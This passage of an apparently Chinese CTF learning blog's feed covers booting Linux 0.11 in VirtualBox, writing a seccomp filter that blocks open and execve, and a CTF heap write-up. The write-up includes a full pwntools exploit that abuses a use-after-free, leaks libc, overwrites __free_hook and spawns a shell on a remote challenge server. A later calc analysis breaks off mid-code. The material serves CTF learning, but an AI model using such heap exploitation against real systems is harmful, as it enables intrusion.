    <content type="html"><![CDATA[<h1 id="使用virtual-box-启动linux-0-11内核映像"><a href="#使用virtual-box-启动linux-0-11内核映像" class="headerlink" title="使用virtual box 启动linux-0.11内核映像"></a>使用virtual box 启动linux-0.11内核映像</h1><p>需要两个软盘，第一个软盘存放内核映像，第二个软盘存放文件系统(可能是叫文件系统?)</p><h2 id="写内核映像到软盘中"><a href="#写内核映像到软盘中" class="headerlink" title="写内核映像到软盘中."></a>写内核映像到软盘中.</h2><p>需要提前编译好内核映像</p><ol><li>使用bximage创建软盘</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install bximage</span><br></pre></td></tr></table></figure><ol start="2"><li>将内核映像写入到软盘中</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=boot.bin of=./boot.img bs=512  conv=notrunc</span><br></pre></td></tr></table></figure><h2 id="写文件系统到软盘中"><a href="#写文件系统到软盘中" class="headerlink" title="写文件系统到软盘中"></a>写文件系统到软盘中</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">sb@sb-virtual-machine:~/Desktop$ bximage </span><br><span class="line">========================================================================</span><br><span class="line">                                bximage</span><br><span class="line">  Disk Image Creation / Conversion / Resize and Commit Tool <span class="keyword">for</span> Bochs</span><br><span class="line">         <span class="variable">$Id</span>: bximage.cc 13481 2018-03-30 21:04:04Z vruppert $</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">1. Create new floppy or hard disk image</span><br><span class="line">2. Convert hard disk image to other format (mode)</span><br><span class="line">3. Resize hard disk image</span><br><span class="line">4. Commit <span class="string">&#x27;undoable&#x27;</span> redolog to base image</span><br><span class="line">5. Disk image info</span><br><span class="line"></span><br><span class="line">0. Quit</span><br><span class="line"></span><br><span class="line">Please choose one [0] 1</span><br><span class="line"></span><br><span class="line">Create image</span><br><span class="line"></span><br><span class="line">Do you want to create a floppy disk image or a hard disk image?</span><br><span class="line">Please <span class="built_in">type</span> hd or fd. [hd] fd</span><br><span class="line"></span><br><span class="line">Choose the size of floppy disk image to create.</span><br><span class="line">Please <span class="built_in">type</span> 160k, 180k, 320k, 360k, 720k, 1.2M, 1.44M, 1.68M, 1.72M, or 2.88M.</span><br><span class="line"> [1.44M] </span><br><span class="line"></span><br><span class="line">What should be the name of the image?</span><br><span class="line">[a.img] root.img</span><br><span class="line"></span><br><span class="line">Creating floppy image <span class="string">&#x27;root.img&#x27;</span> with 2880 sectors</span><br><span class="line"></span><br><span class="line">The following line should appear <span class="keyword">in</span> your bochsrc:</span><br><span class="line">  floppya: image=<span class="string">&quot;root.img&quot;</span>, status=inserted</span><br><span class="line">sb@sb-virtual-machine:~/Desktop$ <span class="built_in">dd</span> <span class="keyword">if</span>=rootimage-0.11 of=./root.img bs=512 conv=notrunc</span><br><span class="line">2880+0 records <span class="keyword">in</span></span><br><span class="line">2880+0 records out</span><br><span class="line">1474560 bytes (1.5 MB, 1.4 MiB) copied, 0.0044515 s, 331 MB/s</span><br></pre></td></tr></table></figure><p>这个 rootimage-0.11 文件是从这个网站中找到的: <a href="http://www.oldlinux.org/Linux.old/bochs/">Index of &#x2F;Linux.old&#x2F;bochs&#x2F; (oldlinux.org)</a></p><p>下载链接: <a href="http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-050518.zip">http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-050518.zip</a> (这个貌似是bochs调试用的，暂时还没搞成功，先用vbox启动成功再说)</p><p>找到rootimage-0.11文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled.png" alt="Untitled"></p><h2 id="启动linux-0-11"><a href="#启动linux-0-11" class="headerlink" title="启动linux-0.11"></a>启动linux-0.11</h2><p>现在我门有了两个文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%201.png" alt="Untitled"></p><p>到Virtual Box中添加这两个img文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%202.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%203.png" alt="Untitled"></p><p>然后 点击启动，就能开机了</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%204.png" alt="Untitled"></p><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识:"></a>补充知识:</h1><p>硬盘结构:</p><ol><li>盘片（platter）</li><li>磁头（head）</li><li>磁道（track）</li><li>扇区（sector）</li><li>柱面（cylinder）</li></ol><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%205.png" alt="Untitled"></p><p>BIOS中断例程 查询:</p><p><a href="http://www.ablmcc.edu.hk/~scy/CIT/8086_bios_and_dos_interrupts.htm#int13h_02h">8086 bios and dos interrupts (IBM PC) (ablmcc.edu.hk)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用virtual-box-启动linux-0-11内核映像&quot;&gt;&lt;a href=&quot;#使用virtual-box-启动linux-0-11内核映像&quot; class=&quot;headerlink&quot; title=&quot;使用virtual box 启动linux-0.11内核映像&quot;&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://h4ckf0rfun.github.io/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>seccomp-filter</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/15/seccomp-filter/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/15/seccomp-filter/</id>
    <published>2022-11-15T15:46:59.000Z</published>
    <updated>2022-11-15T15:52:19.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="seccomp-filter"><a href="#seccomp-filter" class="headerlink" title="seccomp filter"></a>seccomp filter</h1><p>这个东西是能自定义过滤掉一些系统调用，应该是在syscall之前加了一个hook. 具体内核的实现还没有了解过.等之后抽空看一下.</p><p>这里记录一下如何编写:</p><ol><li>编写过滤规则</li></ol><p>类似汇编代码，在执行这段代码时，会给一个seccomp data作为参数，可以用ld 指令加载seccomp data指定偏移处的数据到 A 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   nr;                   <span class="comment">/* System call number */</span></span><br><span class="line">    __u32 arch;                 <span class="comment">/* AUDIT_ARCH_* value (see &lt;linux/audit.h&gt;) */</span></span><br><span class="line">    __u64 instruction_pointer;  <span class="comment">/* CPU instruction pointer */</span></span><br><span class="line">    __u64 args[<span class="number">6</span>];              <span class="comment">/* Up to 6 system call arguments */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里给出一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ld [<span class="number">4</span>]                  <span class="comment">/* offsetof(struct seccomp_data, arch) */</span></span><br><span class="line">jne #<span class="number">0xc000003e</span>, bad    <span class="comment">/* AUDIT_ARCH_X86_64 */</span></span><br><span class="line">ld [<span class="number">0</span>]                  <span class="comment">/* offsetof(struct seccomp_data, nr) */</span></span><br><span class="line">jge #<span class="number">0x40000000</span>,bad</span><br><span class="line">  </span><br><span class="line">jeq #<span class="number">2</span>, bad             <span class="comment">/* open */</span></span><br><span class="line">jeq #<span class="number">257</span>, bad           <span class="comment">/* openat */</span></span><br><span class="line">jeq #<span class="number">59</span>, bad            <span class="comment">/* execve */</span></span><br><span class="line">jeq #<span class="number">322</span>, bad           <span class="comment">/* execveat */</span></span><br><span class="line"></span><br><span class="line">good: ret #<span class="number">0x7fff0000</span>   <span class="comment">/* SECCOMP_RET_ALLOW */</span></span><br><span class="line">bad: ret #<span class="number">0x80000000</span>    <span class="comment">/* SECCOMP_RET_KILL_PROCESS */</span></span><br></pre></td></tr></table></figure><ol start="2"><li>之后用bpf_asm(linux的tool或者python的模块)生成C语言数组:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3  -m bpf_asm -c seccomp_rules.bpf</span><br></pre></td></tr></table></figure><p>生成的数组是这样子的;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sb@sb-virtual-machine:~/Desktop$ python3 -m bpf_asm -c ./seccomp_rule.bpf</span><br><span class="line">&#123; 0x20, 0, 0, 0x00000004 &#125;,</span><br><span class="line">&#123; 0x15, 0, 7, 0xc000003e &#125;,</span><br><span class="line">&#123; 0x20, 0, 0, 0x00000000 &#125;,</span><br><span class="line">&#123; 0x35, 5, 0, 0x40000000 &#125;,</span><br><span class="line">&#123; 0x15, 4, 0, 0x00000002 &#125;,</span><br><span class="line">&#123; 0x15, 3, 0, 0x00000101 &#125;,</span><br><span class="line">&#123; 0x15, 2, 0, 0x0000003b &#125;,</span><br><span class="line">&#123; 0x15, 1, 0, 0x00000142 &#125;,</span><br><span class="line">&#123; 0x6, 0, 0, 0x7fff0000 &#125;,</span><br><span class="line">&#123; 0x6, 0, 0, 0x80000000 &#125;,</span><br></pre></td></tr></table></figure><p>拷贝到C语言代码里面:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">sock_filter</span> <span class="title">filters</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">   &#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000004</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0xc000003e</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x35</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0x40000000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x00000002</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0x00000101</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x0000003b</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x15</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x00000142</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x7fff0000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80000000</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">fprog</span> =</span> &#123;</span><br><span class="line">   .filter = filters,</span><br><span class="line">   .len = <span class="keyword">sizeof</span>(filters) / <span class="keyword">sizeof</span>(filters[<span class="number">0</span>])</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>之后用prctl或者seccomp 系统调用就可以开启了:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp(SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;fprog);</span><br></pre></td></tr></table></figure><p>如果失败的话，使用 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>原因:</p><blockquote><p>In order to use the SECCOMP_SET_MODE_FILTER operation, either the calling thread must have the CAP_SYS_ADMIN  capability  in its  user namespace, or the thread must already have the no_new_privs bit set.  If that bit was not already set by an ancestor of this thread, the thread must make the following call:</p><p>prctl(PR_SET_NO_NEW_PRIVS, 1);</p><p>Otherwise, the SECCOMP_SET_MODE_FILTER operation fails and returns EACCES in errno.  This requirement ensures  that  an  un‐privileged  process  cannot  apply  a  malicious(恶意的)  filter and then invoke a set-user-ID or other privileged program using execve(2), thus potentially compromising that program.  (Such a malicious filter might, for example, cause an attempt  to  use setuid(2) to set the caller’s user IDs to nonzero values to instead return 0 without actually making the system call.  Thus,the program might be tricked into retaining superuser privileges in circumstances where it is possible to influence it to do dangerous things because it did not actually drop privileges.)</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;seccomp-filter&quot;&gt;&lt;a href=&quot;#seccomp-filter&quot; class=&quot;headerlink&quot; title=&quot;seccomp filter&quot;&gt;&lt;/a&gt;seccomp filter&lt;/h1&gt;&lt;p&gt;这个东西是能自定义过滤掉一些系统调用，应该是</summary>
      
    
    
    
    <category term="linux" scheme="https://h4ckf0rfun.github.io/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>UAF而不是double free - DAS10月总结</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/</id>
    <published>2022-10-24T11:15:33.000Z</published>
    <updated>2022-10-24T11:17:46.785Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%201.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%202.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled%203.png" alt="Untitled"></p><p>常规的菜单题，只有add和free两种操作，并且还有一次backdoor的机会，在backdoor中，free后并没有将指针置为0，导致了UAF 漏洞</p><p>还是没有懂得UAF的真谛，一看到这个就想到了double free来利用，但是由于add次数限制，最后也没有想出来。今天上课时才忽然明白，并不是doule free利用。</p><p>UAF 的全程是use after free，即释放后在使用，这里backdoor里面free之后没有置为0，导致了之后我们仍然可以使用它。</p><p>既然已经被释放了，它里面的数据是无法确定的，也就是说，我想到的double free ,是假设它里面的内容没有变(准确的说是堆块的位置没有改变)，然后使某个堆块被分配出两次。但是实际上，free内的一系列操作，可能会改变堆块的位置，因为有合并操作。</p><p>在本题中，UAF 中的use 是指 再次进行free操作，此时的free有两种情况:</p><ol><li>double free 同一个chunk</li><li>free掉一个伪造的chunk</li></ol><p>double free这种利用方法在此题目malloc次数的限制下，是明显不行的。如果free掉一个伪造的chunk，可以造成堆块重叠，而且可以在限制的次数内成功exploit</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28301</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        add(<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">        free(<span class="number">8</span> - i);</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    backdoor(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,payload)       <span class="comment">#0x100, fake chunk.</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)          <span class="comment">##emmm.get left chunk </span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)                 <span class="comment">## overlapped chunk</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)      <span class="comment">###11</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)      <span class="comment">###12</span></span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="string">b&#x27;\xa0\x16&#x27;</span>)       <span class="comment">#13</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = p64(<span class="number">0x1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x08&#x27;</span></span><br><span class="line">    add(<span class="number">0x80</span>,payload)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout = <span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc.address &lt; <span class="number">0x7f0000000000</span> <span class="keyword">or</span> (libc.address &amp; <span class="number">0xfff</span>) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;libc.address error&#x27;</span>)</span><br><span class="line">    success(<span class="string">&#x27;libc:&#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28301</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        success(<span class="string">&#x27;pwn success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">11</span>)</span><br><span class="line">        free(<span class="number">10</span>)</span><br><span class="line">        free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0</span>))         <span class="comment">#payload</span></span><br><span class="line">        add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)                <span class="comment">#alloc to __free_hook..</span></span><br><span class="line">        add(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))   </span><br><span class="line">        <span class="comment">#get shell</span></span><br><span class="line">        free(<span class="number">17</span>)</span><br><span class="line">        success(<span class="string">&#x27;get shell!&#x27;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>总之，要认真体会UAF 的含义，不要被限制思维。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/24/DAS10%E6%9C%88%E6%80%BB%E7%BB%93/Untitled.png&quot; alt=&quot;Untitled&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:/</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnable.tw-calc</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/</id>
    <published>2022-10-20T15:49:43.000Z</published>
    <updated>2022-10-24T11:24:24.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw-calc/Untitled.png" alt="Untitled"></p><p>题目是一个简易的计算器程序，只能进行 + ,- ,* ,&#x2F; , % ,而且没有括号。并且有两个栈，一个符号栈，一个数字栈。数字栈的第一个元素用来保存top。</p><p>parse_expr函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">char</span> *expr, _DWORD *NumStack)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> top; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *num_start; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> OptTop; <span class="comment">// [esp+28h] 